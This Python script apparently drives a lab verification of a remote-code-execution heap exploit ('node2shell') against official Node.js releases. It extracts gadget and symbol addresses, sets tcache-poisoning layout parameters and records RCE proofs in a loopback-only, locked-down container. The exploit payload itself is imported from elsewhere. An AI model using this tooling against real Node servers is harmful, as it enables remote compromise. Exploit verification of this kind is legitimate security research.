#!/usr/bin/env python3
"""Verify the official affected Node matrix with ASLR and no debugger.

Successful attempts use only loopback network input and a fixed `/usr/bin/id`
callback proof.  The runner never launches GDB, reads process addresses, or
injects a preload library.
"""

from __future__ import annotations

import argparse
import copy
from datetime import datetime, timezone
import importlib.util
import json
import os
from pathlib import Path
import re
import shutil
import subprocess
import sys
import tempfile


ROOT = Path(__file__).parents[1]
EVIDENCE_DIR = ROOT / "evidence" / "aslr-on-network-only"
WORK_PARENT = Path(os.environ.get("N2S_MATRIX_WORKDIR", str(Path.home() / "node2shell-matrix")))
DOCKER = os.environ.get("N2S_DOCKER", shutil.which("docker") or "/snap/bin/docker")
IMAGE = "node2shell-nonce-local:matrix"
CONTAINER = "node2shell-aslr-network-current"
SERVER = ROOT / "lab" / "worker-record-transform" / "server.js"


def load(name: str, path: Path):
    spec = importlib.util.spec_from_file_location(name, path)
    module = importlib.util.module_from_spec(spec)
    assert spec.loader is not None
    sys.modules[name] = module
    spec.loader.exec_module(module)
    return module


DIRECT = load("n2s_direct_matrix_support", ROOT / "tools" / "verify_release_matrix.py")
HEAP = load("n2s_heap_chain", ROOT / "poc" / "node2shell_heap.py")
SELECTOR = load("n2s_heap_layout_selector", ROOT / "poc" / "heap_layout_selector.py")


def number(value: object) -> int:
    return int(value, 0) if isinstance(value, str) else int(value)


def docker(*arguments: str, check: bool = True) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        [DOCKER, *arguments],
        check=check,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
    )


def stop_container() -> None:
    docker("rm", "-f", CONTAINER, check=False)


def static_symbols(binary: Path) -> dict[str, int]:
    output = subprocess.run(
        ["nm", "-n", "--defined-only", str(binary)],
        check=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    ).stdout
    selected: dict[str, list[int]] = {"pFree": [], "pContext": [], "callback": []}
    for line in output.splitlines():
        fields = line.split(maxsplit=2)
        if len(fields) != 3 or re.fullmatch(r"[0-9a-fA-F]+", fields[0]) is None:
            continue
        address = int(fields[0], 16)
        name = fields[2]
        if name == "_ZL5pFree":
            selected["pFree"].append(address)
        elif name == "_ZL8pContext":
            selected["pContext"].append(address)
        elif "uvimpl4Work16DoThreadPoolWorkEv" in name and name.startswith("_ZThn"):
            selected["callback"].append(address)
    duplicates = {name: values for name, values in selected.items() if len(values) != 1}
    if duplicates:
        raise RuntimeError(f"expected one static symbol per role, got {duplicates}")
    return {name: values[0] for name, values in selected.items()}


def layout_candidates(node_binary_sha256: str) -> list[dict[str, int | str]]:
    return SELECTOR.select_layouts(node_binary_sha256)


def derive_profile(binary: Path, version: str, candidate: dict[str, int | str]):
    analysis = DIRECT.ANALYZER.extract(binary)
    symbols = static_symbols(binary)
    base = min(symbols["pFree"], symbols["pContext"]) & ~0xF
    profile = HEAP.HeapProfile(
        version=version,
        node_binary_sha256=str(analysis["node_binary_sha256"]),
        bss_payload=base,
        callback_gadget=symbols["callback"],
        execvp_plt=number(analysis["execvp_plt"]),
        callback_pointer_offset=symbols["pFree"] - base,
        context_pointer_offset=symbols["pContext"] - base,
        poison_staged_position=int(candidate["poison_staged_position"]),
        record_size=int(candidate["record_size"]),
        tcache_index=int(candidate["tcache_index"]),
        ring_from_heap=int(candidate["ring_from_heap"]),
    )
    profile.validate()
    return profile, analysis, symbols


def start_container(
    binary: Path,
    record_size: int,
    *,
    server_profile: str = "baseline",
    heap_noise_blocks: int = 0,
    image: str = IMAGE,
) -> dict[str, object]:
    if server_profile not in {"baseline", "observed", "socket-tuned"}:
        raise ValueError("unsupported server profile")
    if not 0 <= heap_noise_blocks <= 32:
        raise ValueError("heap noise blocks must be between 0 and 32")
    stop_container()
    completed = docker(
        "run", "--platform", "linux/amd64", "-d",
        "--name", CONTAINER,
        "--label", "org.openai.node2shell-lab=true",
        "--label", "org.openai.node2shell-aslr=enabled-network-only",
        "--read-only", "--tmpfs", "/tmp:rw,noexec,nosuid,size=16m",
        "--cap-drop", "ALL", "--security-opt", "no-new-privileges",
        "--security-opt", "seccomp=unconfined", "--pids-limit", "128",
        "--memory", "512m", "--cpus", "1.0", "--network", "host",
        "-e", "UV_THREADPOOL_SIZE=1",
        "-e", f"N2S_RECORD_SIZE={record_size:#x}",
        "-e", f"N2S_SERVER_PROFILE={server_profile}",
        "-e", f"N2S_HEAP_NOISE_BLOCKS={heap_noise_blocks}",
        "-v", f"{binary}:/usr/local/bin/node:ro",
        "-v", f"{SERVER}:/app/worker-record-server.js:ro",
        "--entrypoint", "/usr/local/bin/node", image, "/app/worker-record-server.js",
    )
    if not completed.stdout.strip():
        raise RuntimeError("Docker did not return a container id")
    aslr = docker("exec", CONTAINER, "cat", "/proc/sys/kernel/randomize_va_space").stdout.strip()
    if aslr != "2":
        raise RuntimeError(f"expected randomize_va_space=2, got {aslr!r}")
    environment = json.loads(docker("inspect", "--format", "{{json .Config.Env}}", CONTAINER).stdout)
    forbidden = [
        value for value in environment
        if value.startswith("LD_PRELOAD=") or value == "N2S_DISABLE_ASLR=1"
    ]
    if forbidden:
        raise RuntimeError(f"forbidden runtime environment: {forbidden}")
    os_release = docker(
        "exec", CONTAINER, "sh", "-c",
        ". /etc/os-release; printf '%s|%s' \"$ID\" \"$VERSION_ID\"",
    ).stdout.strip()
    image_id = docker("inspect", "--format", "{{.Image}}", CONTAINER).stdout.strip()
    return {
        "kernel_randomize_va_space": 2,
        "n2s_disable_aslr_present": False,
        "ld_preload_present": False,
        "server_profile": server_profile,
        "heap_noise_blocks": heap_noise_blocks,
        "runtime_image": image,
        "runtime_image_id": image_id,
        "runtime_os_release": os_release,
    }


def public_profile(profile, symbols: dict[str, int], candidate: dict[str, int | str]) -> dict[str, object]:
    return {
        "layout_candidate": candidate["name"],
        "layout_selection": candidate["selection"],
        "record_size": f"0x{profile.record_size:x}",
        "tcache_index": profile.tcache_index,
        "ring_from_heap": f"0x{profile.ring_from_heap:x}",
        "tcache_entry_from_heap": f"0x{int(candidate['tcache_entry_from_heap']):x}",
        "poison_staged_position": f"{profile.poison_staged_position:#x}",
        "bss_payload": f"0x{profile.bss_payload:x}",
        "pFree": f"0x{symbols['pFree']:x}",
        "pContext": f"0x{symbols['pContext']:x}",
        "callback_pointer_offset": f"0x{profile.callback_pointer_offset:x}",
        "context_pointer_offset": f"0x{profile.context_pointer_offset:x}",
        "callback_gadget": f"0x{profile.callback_gadget:x}",
        "execvp_plt": f"0x{profile.execvp_plt:x}",
    }


def verify_one(version: str, timeout: float, retries_per_layout: int) -> dict[str, object]:
    print(f"NETWORK-MATRIX version={version} phase=download", flush=True)
    with tempfile.TemporaryDirectory(prefix=f"network-v{version}-", dir=WORK_PARENT) as temporary:
        binary, archive_sha, archive_url = DIRECT.fetch_official_binary(version, Path(temporary))
        attempts: list[dict[str, object]] = []
        runtime: dict[str, object] = {}
        analysis: dict[str, object] | None = None
        symbols: dict[str, int] | None = None
        preliminary = DIRECT.ANALYZER.extract(binary)
        for candidate in layout_candidates(str(preliminary["node_binary_sha256"])):
            profile, analysis, symbols = derive_profile(binary, version, candidate)
            for candidate_attempt in range(1, retries_per_layout + 1):
                print(
                    f"NETWORK-MATRIX version={version} candidate={candidate['name']} "
                    f"layout_attempt={candidate_attempt}/{retries_per_layout} "
                    f"position={profile.poison_staged_position:#x}",
                    flush=True,
                )
                started = datetime.now(timezone.utc)
                try:
                    runtime = start_container(binary, profile.record_size)
                    HEAP.wait_ready()
                    proof = HEAP.attack(profile, timeout)
                    attempts.append(
                        {
                            "candidate": candidate["name"],
                            "candidate_attempt": candidate_attempt,
                            "outcome": "rce-proof",
                            "elapsed_seconds": round((datetime.now(timezone.utc) - started).total_seconds(), 3),
                        }
                    )
                    result = {
                        **proof,
                        "version": version,
                        "node_binary_sha256": profile.node_binary_sha256,
                        "official_archive_url": archive_url,
                        "official_archive_sha256": archive_sha,
                        "verification_mode": "official-linux-x64-aslr-enabled-network-only-worker-heap",
                        "profile": public_profile(profile, symbols, candidate),
                        "attempts": attempts,
                        "lab_controls": {
                            "target": "127.0.0.1:3000",
                            "callback": "127.0.0.1:4444",
                            "read_only_rootfs": True,
                            "cap_drop": "ALL",
                            "no_new_privileges": True,
                            "proof_command": "/usr/bin/id (fixed)",
                            "aslr": "enabled",
                            "debugger_used": False,
                            "address_read_used": False,
                            **runtime,
                        },
                        "verified_at": datetime.now(timezone.utc).isoformat(),
                    }
                    return result
                except Exception as error:
                    logs = docker("logs", "--tail", "20", CONTAINER, check=False).stdout[-2000:]
                    attempts.append(
                        {
                            "candidate": candidate["name"],
                            "candidate_attempt": candidate_attempt,
                            "outcome": "not-verified",
                            "error": f"{type(error).__name__}: {error}",
                            "container_log_tail": logs,
                            "elapsed_seconds": round((datetime.now(timezone.utc) - started).total_seconds(), 3),
                        }
                    )
                finally:
                    stop_container()
        assert analysis is not None and symbols is not None
        return {
            "result": "not-verified",
            "version": version,
            "node_binary_sha256": analysis["node_binary_sha256"],
            "official_archive_url": archive_url,
            "official_archive_sha256": archive_sha,
            "verification_mode": "official-linux-x64-aslr-enabled-network-only-worker-heap",
            "attempts": attempts,
            "verified_at": datetime.now(timezone.utc).isoformat(),
        }


def save_json(path: Path, value: object) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(value, ensure_ascii=False, indent=2, sort_keys=True) + "\n", encoding="utf-8")


def write_summary(scope: list[str]) -> dict[str, object]:
    verified = []
    failed: dict[str, str] = {}
    for version in scope:
        path = EVIDENCE_DIR / f"{version}.json"
        if not path.exists():
            failed[version] = "missing evidence"
            continue
        record = json.loads(path.read_text(encoding="utf-8"))
        if record.get("result") == "rce-verified":
            verified.append(version)
        else:
            failed[version] = str(record.get("error", record.get("result", "unknown")))
    summary = {
        "official_affected_linux_x64_release_count": len(scope),
        "rce_verified_count": len(verified),
        "rce_verified_versions": verified,
        "failed_or_unverified": failed,
        "complete": len(verified) == len(scope),
        "verification_mode": "official-linux-x64-aslr-enabled-network-only-worker-heap",
        "debugger_used": False,
        "address_read_used": False,
        "generated_at": datetime.now(timezone.utc).isoformat(),
    }
    save_json(EVIDENCE_DIR / "summary.json", summary)
    return summary


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--version", action="append", help="verify only this exact release")
    parser.add_argument("--limit", type=int)
    parser.add_argument("--include-verified", action="store_true")
    parser.add_argument("--timeout", type=float, default=12.0)
    parser.add_argument("--retries-per-layout", type=int, default=2)
    args = parser.parse_args()
    if not 3.0 <= args.timeout <= 30.0:
        parser.error("--timeout must be between 3 and 30 seconds")
    if not 1 <= args.retries_per_layout <= 3:
        parser.error("--retries-per-layout must be between 1 and 3")
    WORK_PARENT.mkdir(parents=True, exist_ok=True)
    scope = DIRECT.official_scope()
    selected = args.version or scope
    unknown = sorted(set(selected) - set(scope), key=DIRECT.semver)
    if unknown:
        parser.error("outside official affected scope: " + ", ".join(unknown))
    if not args.include_verified:
        selected = [
            version for version in selected
            if not (
                (EVIDENCE_DIR / f"{version}.json").exists()
                and json.loads((EVIDENCE_DIR / f"{version}.json").read_text(encoding="utf-8")).get("result")
                == "rce-verified"
            )
        ]
    if args.limit is not None:
        selected = selected[: args.limit]
    failures = 0
    for version in selected:
        try:
            result = verify_one(version, args.timeout, args.retries_per_layout)
        except Exception as error:
            stop_container()
            result = {
                "version": version,
                "result": "not-verified",
                "error": f"{type(error).__name__}: {error}",
                "verified_at": datetime.now(timezone.utc).isoformat(),
            }
        save_json(EVIDENCE_DIR / f"{version}.json", result)
        print(f"NETWORK-MATRIX version={version} result={result['result']}", flush=True)
        if result.get("result") != "rce-verified":
            failures += 1
    summary = write_summary(scope)
    print(json.dumps(summary, ensure_ascii=False, indent=2), flush=True)
    return 1 if failures else 0


if __name__ == "__main__":
    raise SystemExit(main())
